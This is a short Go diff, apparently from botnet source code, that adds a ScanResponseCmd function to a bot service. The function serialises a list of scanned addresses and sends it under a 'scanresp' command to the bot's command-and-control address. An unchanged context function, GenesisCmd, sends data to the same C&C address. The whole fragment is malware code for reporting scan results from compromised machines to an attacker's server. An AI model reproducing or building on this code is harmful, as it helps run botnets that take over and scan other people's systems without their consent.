@@ -20,3 +20,17 @@ func (b *BotService) GenesisCmd(bot *botnet.Bot) error {
 
 	return sendData(b.Bot.CCAddr, data)
 }
+
+//ScanResponseCmd is
+func (b *BotService) ScanResponseCmd(addrs []string) error {
+	req := scanResponse{addrs}
+
+	buff, err := botnet.Bytes(req)
+	if err != nil {
+		return err
+	}
+
+	payload := append(commandToBytes("scanresp"), buff...)
+
+	return sendData(b.Bot.CCAddr, payload)
+}
